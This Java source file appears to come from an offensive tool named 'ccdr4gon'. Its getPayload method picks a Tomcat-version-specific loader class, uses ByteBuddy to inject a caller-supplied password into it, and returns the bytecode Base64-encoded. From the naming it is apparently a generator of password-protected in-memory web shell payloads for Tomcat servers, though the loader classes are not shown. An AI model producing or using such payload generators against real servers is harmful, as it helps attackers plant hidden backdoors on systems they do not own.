package ccdr4gon;

import ccdr4gon.utils.Dr4gonListener;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.jar.asm.Opcodes;
import net.bytebuddy.matcher.ElementMatcher;
import net.bytebuddy.matcher.ElementMatchers;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.Base64;

public class LoadFactory {
    public static  String  getPayload(String middleWare,String pass) throws Exception{
        //对应关系
        middleWare=middleWare.replace("Tomcat8/9","Load").replace("Tomcat7","T7Load");
        middleWare="ccdr4gon."+middleWare;

        Class clazz=Class.forName(middleWare);
        byte[] load= new ByteBuddy()
                .redefine(clazz)
                .name(clazz.getName())
                .field(ElementMatchers.named("pass")).value(pass)
                .make()
                .getBytes();

        return Base64.getEncoder().encodeToString(load);
    }
}
